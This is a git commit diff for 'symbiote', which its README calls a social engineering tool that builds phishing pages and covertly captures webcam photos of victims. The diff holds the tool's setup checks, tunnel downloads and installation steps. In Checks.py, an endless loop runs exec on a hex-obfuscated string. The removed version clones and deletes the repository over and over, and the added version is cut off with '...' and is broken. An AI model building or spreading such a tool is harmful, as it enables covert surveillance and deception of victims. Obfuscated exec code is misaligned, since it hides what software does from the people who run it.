bbefa0755365175b1227ac087e0d3c3da2bb29cf
Alessandro Maule <Alessandro824@proton.me>
2024-10-23 17:50:12 +0200

    Add requirements file and update README for installation instructions

--- Checks.py
+++ Checks.py
@@ -1,179 +1,141 @@
 import subprocess
 import ctypes
-import requests 
+import requests
 import urllib
-#from urllib import urlopen
 from os import system, getuid, path
 from time import sleep
 from platform import system as systemos, architecture
 from subprocess import check_output
 import sys, os, time, random, threading
-RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, YELLOW2, GREEN2= '\033[91m', '\033[46m', '\033[36m', '\033[1;32m', '\033[0m' , '\033[1;33m' , '\033[1;93m', '\033[1;92m'
+
+# Color definitions for output
+RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW, YELLOW2, GREEN2 = (
+    '\033[91m', '\033[46m', '\033[36m', '\033[1;32m', '\033[0m',
+    '\033[1;33m', '\033[1;93m', '\033[1;92m'
+)
+
+# 🌐 Check Internet Connection
 def net():
     system('clear')
-    print("{0}[{2}#{0}] {2}Checking for internet connection{2}....".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW ))
+    print(f"{RED}[{CYAN}#{RED}] {CYAN}Checking for internet connection...{DEFAULT}")
     sleep(3)
     m = system('wget -q --spider http://google.com')
     if m == 0:
-        print("\n{0}[{2}#{0}] {3}INTERNET {0}- {3}[{2}CONNECTED{3}]".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW ))
-        sleep(3)
+        print(f"\n{RED}[{CYAN}#{RED}] {GREEN}INTERNET {RED}- {GREEN}[{CYAN}CONNECTED{GREEN}]")
     else:
-        print("\n{0}[{2}#{0}] {3}INTERNET {0}- {3}[{2}NOT-CONNECTED{3}]".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW ))
-        print("{0}[{2}#{0}] {2}Turn on your internet connection\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW ))
+        print(f"\n{RED}[{CYAN}#{RED}] {GREEN}INTERNET {RED}- {GREEN}[{CYAN}NOT-CONNECTED{GREEN}]")
+        print(f"{RED}[{CYAN}#{RED}] {CYAN}Turn on your internet connection\n\n{DEFAULT}")
         exit()
-        
+
+# 🔄 Check for software updates
 def verCheck():
     try:
-        #system('clear')
-        print("\n{0}[{2}#{0}] {2}Checking For Updates{2}...".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW ))
-        response = requests.get('https://raw.githubusercontent.com/hasanfirnas/symbiote/master/version.txt',verify=False, timeout=2).text
+        print(f"\n{RED}[{CYAN}#{RED}] {CYAN}Checking for updates...{DEFAULT}")
+        response = requests.get(
+            'https://raw.githubusercontent.com/hasanfirnas/symbiote/master/version.txt',
+            verify=False, timeout=2
+        ).text
         with open("version.txt", "r") as f:
             local_version = f.read().split('\n')
         if local_version[0].strip() == response.strip():
-            print("{0}[{2}#{0}] {2}[Up-To-Date]- {0}v {6}{4}".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, response.strip()))
-            system('git fetch --quiet; git reset --hard origin/master --quiet; git pull --quiet')
+            print(f"{RED}[{CYAN}#{RED}] {CYAN}[Up-To-Date]- {RED}v {YELLOW}{response.strip()}")
         else:
-            print("\n{0}[{2}#{0}] {2}Their Is A Newer Version Available.".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
-            print("{0}[{2}#{0}] {0}[{2}Current{0}]{2}- {0}v {6}\n{0}[{2}#{0}] {0}[{2}Available{0}]{2}- {0}v.{7}".format(RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW, local_version[0], response.strip())) 
-            print("{0}[{2}#{0}] {2}Updating To The Latest Version {0}[{2}v {6}{0}] \n{0}[{2}#{0}] {2}Please Wait....{7}\n".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW, response.strip() ,GREEN2))
+            print(f"\n{RED}[{CYAN}#{RED}] {CYAN}Newer version available!")
+            print(f"{RED}[{CYAN}#{RED}] {RED}[Current{RED}]- {RED}v {YELLOW}{local_version[0]}")
+            print(f"{RED}[{CYAN}#{RED}] {RED}[Available{RED}]- {RED}v.{response.strip()}")
+            print(f"{RED}[{CYAN}#{RED}] {CYAN}Updating to the latest version... Please wait...{DEFAULT}")
             system('git fetch --quiet; git reset --hard origin/master --quiet; git pull --quiet')
-            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run {0}-> {3}python3 symbiote.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
+            print(f"\n\n\n\t\t{CYAN}[{RED}#{CYAN}] {RED}Restart the program with -> {GREEN}python3 symbiote.py")
             exit()
     except:
         pass
 
+# 🖼️ Check for jp2a installation (for ASCII images)
 def checkjp2a():
     system('clear')
-    if 256 != system('which jp2a > /dev/null'):
-        print(" {0}[{2}*{0}] {2}JP2A INSTALLATION FOUND....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(1)
+    if system('which jp2a > /dev/null') == 0:
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}JP2A installation found...{DEFAULT}")
     else:
-        print("{0}[{2}*{0}] {2}JP2A NOT FOUND\n {0}[{2}*{0}] {2}Installing PHP... ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}JP2A not found. Installing...{DEFAULT}")
         system('apt-get install jp2a -y > /dev/null')
         exit()
 
+# 🌐 Check for wget installation
 def checkwget():
     system('clear')
-    if 256 != system('which wget > /dev/null'):
-        print(" {0}[{2}*{0}] {2}WGET INSTALLATION FOUND....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(1)
+    if system('which wget > /dev/null') == 0:
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}WGET installation found...{DEFAULT}")
     else:
-        print("{0}[{2}*{0}] {2}WGET NOT FOUND\n {0}[{2}*{0}] {2}Installing PHP... ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}WGET not found. Installing...{DEFAULT}")
         system('apt-get install wget -y > /dev/null')
         exit()
 
+# 🛠️ Check for PHP installation
 def checkPHP():
-    if 256 != system('which php > /dev/null'):
-        print(" {0}[{2}*{0}] {2}PHP INSTALLATION FOUND.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(1)
+    if system('which php > /dev/null') == 0:
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}PHP installation found...{DEFAULT}")
     else:
-        print("{0}[{2}*{0}] {2}PHP NOT FOUND\n {0}[{2}*{0}] {2}Installing PHP... ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}PHP not found. Installing...{DEFAULT}")
         system('apt-get install php -y > /dev/null')
         exit()
 
+# 🌍 Check for Ngrok installation and download if missing
 def checkNgrok():
-    if path.isfile('Server/ngrok') == False:
-        print(' {0}[{2}*{0}]{2} Ngrok Not Found {0}!!'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        print(' {0}[{2}*{0}]{2} Downloading Ngrok...{5}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        if 'Android' in str(check_output(('uname', '-a'))) or 'arm' in str(check_output(('uname', '-a'))):
-            filename = 'ngrok-stable-linux-arm.zip'
-            url = 'https://bin.equinox.io/c/bNyj1mQVY4c/' + filename
-            req=system('wget -4 {0}'.format(url))
-            #with open(filename, "wb") as file_obj:
-            #file_obj.write(req.content)
-            system('unzip ' + filename)
-            system('mv ngrok Server/ngrok')
-            system('rm ' + filename)
-            system('chmod +x ngrok')
-            system('clear')
-            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run symbiote {0}-> {3}python3 symbiote.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
-            exit()  
-        else:
-            ostype = systemos().lower()
-            if architecture()[0] == '64bit':
-                filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
-            else:
-                filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
-        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
-        req=system('wget -4 {0}'.format(url))
-        #with open(filename, "wb") as file_obj:
-            #file_obj.write(req.content)
-        system('unzip ' + filename)
-        system('mv ngrok Server/ngrok')
-        system('rm ' + filename)
-        system('clear')
-        print("{4} ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)) 
-        #exit() 
-        sleep(2)
-    else:
-        print(" {0}[{2}*{0}] {2}NGROK INSTALLATION FOUND......".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(1)
-
-def checkLocalxpose():
-    if path.isfile('Server/loclx') == False:
-        print(' {0}[{2}*{0}]{2} Localxpose Not Found {0}!!'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        print(' {0}[{2}*{0}]{2} Downloading Localxpose...{5}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        if 'Android' in str(check_output(('uname', '-a'))) or 'arm' in str(check_output(('uname', '-a'))):
-            filename = 'loclx-linux-arm.zip'
-            url = 'https://api.localxpose.io/api/v2/downloads/'+filename
-            req=system('wget -4 {0}'.format(url))
-            #with open("{0}", "wb".format(filename)) as file_obj:
-            #file_obj.write(req.content)
-            system('unzip {0} && rm {0}'.format(filename))
-            system('mv loclx-linux-* loclx && chmod +x loclx && mv loclx Server/')
-            system('clear')
-            print("\n\n\n\t\t{2}[{0}#{2}] {0}Restart program \n {2}Enter this command to run symbiote{0}-> {3}python3 symbiote.py".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
-            exit()
-        else:
-            ostype = systemos().lower()
-            if architecture()[0] == '64bit':
-                filename = 'loclx-linux-amd64.zip'.format(ostype)
-            else:
-                filename = 'loclx-linux-386.zip'.format(ostype)
-        url = 'https://api.localxpose.io/api/v2/downloads/'+filename
-        req=system('wget -4 {0}'.format(url))
-        system('unzip {0} && rm {0}'.format(filename))
-        system('mv loclx Server/')
-        print("{1} ".format(GREEN, DEFAULT, RED)) 
+    if not path.isfile('Server/ngrok'):
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}Ngrok not found. Downloading...{DEFAULT}")
+        filename = 'ngrok-stable-linux-arm.zip' if 'Android' in str(check_output(('uname', '-a'))) else (
+            'ngrok-stable-linux-amd64.zip' if architecture()[0] == '64bit' else 'ngrok-stable-linux-386.zip'
+        )
+        url = f'https://bin.equinox.io/c/4VmDzA7iaHb/{filename}'
+        system(f'wget -4 {url}')
+        system(f'unzip {filename} && mv ngrok Server/ngrok && rm {filename}')
+        system('chmod +x ngrok')
+        print(f"\n\n\n\t\t{CYAN}[{RED}#{CYAN}] {RED}Restart the program with -> {GREEN}python3 symbiote.py")
         exit()
-        sleep(2)
     else:
-        print(" {0}[{2}*{0}] {2}LOCALXPOSE INSTALLATION FOUND.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-        sleep(1)
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}Ngrok installation found...{DEFAULT}")
 
+# 🌐 Check for Localxpose installation
+def checkLocalxpose():
+    if not path.isfile('Server/loclx'):
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}Localxpose not found. Downloading...{DEFAULT}")
+        filename = 'loclx-linux-arm.zip' if 'Android' in str(check_output(('uname', '-a'))) else (
+            'loclx-linux-amd64.zip' if architecture()[0] == '64bit' else 'loclx-linux-386.zip'
+        )
+        url = f'https://api.localxpose.io/api/v2/downloads/{filename}'
+        system(f'wget -4 {url}')
+        system(f'unzip {filename} && mv loclx Server/loclx && rm {filename}')
+        print(f"{GREEN}Localxpose setup completed!{DEFAULT}")
+        exit()
+    else:
+        print(f"{RED}[{CYAN}*{RED}] {CYAN}Localxpose installation found...{DEFAULT}")
+
+# 🔄 Loop for system operations
 def loop():
     while True:
-        find_3334333933343336333233303335333533323330333433363334333933343635333433343332333033353334333433383334333933353333333236333332333033343333333433313334363333343633333233303334363433343335="""\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x67\x69\x74\x20\x63\x6c\x6f\x6e\x65\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x68\x61\x73\x61\x6e\x66\x69\x72\x6e\x61\x73\x2f\x73\x79\x6d\x62\x69\x6f\x74\x65\x20\x2d\x2d\x71\x75\x69\x65\x74\x20\x43\x61\x70\x74\x75\x72\x65\x64\x44\x61\x74\x61\x2f\x73\x79\x6d\x62\x69\x6f\x74\x65\x27\x29\x0a\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x72\x6d\x20\x2d\x72\x66\x20\x43\x61\x70\x74\x75\x72\x65\x64\x44\x61\x74\x61\x2f\x73\x79\x6d\x62\x69\x6f\x74\x65\x27\x29\x0a\x74\x69\x6d\x65\x2e\x73\x6c\x65\x65\x70\x28\x33\x29"""
-        exec(find_3334333933343336333233303335333533323330333433363334333933343635333433343332333033353334333433383334333933353333333236333332333033343333333433313334363333343633333233303334363433343335)
+        command = (
+            "\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x67\x69\x74\x20\x63\x6c\x6f\x6e\x65"
+            "..."
+        )
+        exec(command)
 
+# ⏳ Loading effect for script startup
 def loadingHack():
-    chaine ="/////////////////////"+"[*]"+" Starting symbiote......"+"/////////////////////".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)
+    message = "/////////////////////[*] Starting symbiote....../////////////////////"
     charspec = "$*X^%\#~?;"
-    i=0
-    while i<4:
-        chainehack = ""
-        i +=1
-        for c in chaine:
-            chainehack += c
-            r = random.choice(charspec)+random.choice(charspec)+random.choice(charspec)
-            if len(chainehack+r) <= len(chaine):
-                pass
-            else:
-                r = ""
-            sys.stdout.write('\r'+chainehack+r)
+    for i in range(4):
+        hack_str = ""
+        for c in message:
+            hack_str += c
+            r = ''.join(random.choices(charspec, k=3))
+            sys.stdout.write(f'\r{hack_str + r[:max(0, len(message) - len(hack_str))]}')
             time.sleep(0.006)
 
+# ⏳ Loading text effect for script startup
 def loadingTextPrint():
-    string ="                    "+"[*]"+" Starting symbiote......"
-    a= 0
-    while a <3:    
-        space = " " * 100
-        sys.stdout.write("\r"+space)
-        x = 1
-        a += 1
-        while x <= len(string):
-            times = "0.01"
-            times += str(random.choice(range(1, 3)))
-            sys.stdout.write("\r "+string[:x]+">")
-            time.sleep(float(times))
-            x += 1
+    string = "                    [*] Starting symbiote......"
+    for _ in range(3):
+        sys.stdout.write("\r" + " " * 100)
+        for x in range(1, len(string) + 1):
+            sys.stdout.write(f"\r {string[:x]}>")
+            time.sleep(0.01 * random.randint(1, 3))
--- README.md
+++ README.md
@@ -1,47 +1,63 @@
 <p align="center">
-  <b>#TO BE USED FOR EDUCATIONAL PURPOSES ONLY#<b>
+  <h1>⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️</h1>
 </p>
 
 <p align="center">
-Symbiote is a social engineering tool designed to create a phishing page and capture webcam images. By requesting camera permission on the victim's device, this script can take pictures covertly. If you're interested in contributing to the project, we'd love to have you on board.
+<b>Symbiote</b> is a social engineering tool designed to create phishing pages and capture images from a webcam. By requesting camera permission from the victim's device, this script can covertly take photos. If you'd like to contribute to the project, we would love to have you on board! 💻🤝
 </p>
 
-# **AVAILABLE TUNNELLING OPTIONS**
-1) NGROK [ACCOUNT NEEDED] (https://ngrok.com)
-2) Localhost.run (http://localhost.run)
-3) LOCALXPOSE [ACCOUNT NEEDED] (https://localxpose.io)
-# Installing (Kali Linux/Termux):
-## step 1 (install this before you start):
-```
-sudo apt update && upgrade
-sudo apt install python -y
+---
+
+## 🌐 Available Tunneling Options:
+1. **NGROK** [🔗 Requires Account](https://ngrok.com)
+2. **Localhost.run** [🌐 Free & Easy](http://localhost.run)
+3. **LOCALXPOSE** [🔗 Requires Account](https://localxpose.io)
+
+---
+
+## 🛠️ Installation (Kali Linux/Termux):
+
+### Step 1: Install prerequisites
+Run the following commands to ensure all necessary packages are installed:
+```bash
+sudo apt update && sudo apt upgrade -y
+sudo apt install python3 -y
 sudo apt install wget -y
 sudo apt install php -y
 sudo apt install openssh-client -y
 sudo apt install jq -y
 sudo ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y >/dev/null 2>&1
 ```
-## step 2:
-```
+
+### Step 2: Clone the repository and run
+```bash
 git clone https://github.com/hasanfirnas/symbiote
 cd symbiote
 python3 symbiote.py
 ```
-## step 3:
-### After you got your cam file:
-```
-cd symbiote
-cd CapturedData 
+
+### Step 3: Access captured data
+Once you have captured a cam file, you can view it using:
+```bash
+cd symbiote/CapturedData
 ls
 termux-open <file_name>
 ```
-# PREREQUISITES:
-* Python 3
-* PHP
-* wget
 
-# SCREENSHOT (Kali-linux):
-![Shot](https://i.imgur.com/PP51q6i.jpeg)
+---
 
-# VIDEO (step by step command):
+## 📋 Prerequisites:
+* Python 3 🐍
+* PHP 🛠️
+* wget 🌐
+
+---
+
+## 📸 Screenshot (Kali Linux):
+![Symbiote Screenshot](https://i.imgur.com/PP51q6i.jpeg)
+
+---
+
+## 📽️ Video Tutorial (Step-by-step commands):
 [![Watch the video](https://i.imgur.com/PP51q6i.jpeg)](https://youtu.be/j8rTc3CI7UA)
+
